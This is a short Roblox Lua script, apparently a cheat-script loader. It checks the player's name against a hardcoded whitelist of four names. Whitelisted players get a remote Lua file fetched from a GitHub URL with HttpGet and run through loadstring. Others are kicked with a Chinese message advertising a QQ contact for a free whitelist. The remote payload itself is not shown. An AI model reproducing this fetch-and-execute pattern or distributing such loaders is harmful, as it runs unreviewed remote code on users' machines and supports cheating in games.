repeat


    task.wait()
until game.Players.LocalPlayer.Character~=nil;
local a=tostring(game.Players.LocalPlayer.Character);
if a=="Hudson_From4"then
_G.whitelisted=true
elseif a=="COM_7723"then
_G.whitelisted=true
elseif a=="KBDPSKNSNSNSN"then
_G.whitelisted=true
elseif a=="gfhvfva"then
_G.whitelisted=true
end
if _G.whitelisted==true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/uwuathehad/uwu/main/XiaoYunV1.0.5.lua"))()
    else
 
game.Players.LocalPlayer:Kick(a.."你没有被列入白名单，QQ168777105给免费白名单")
end
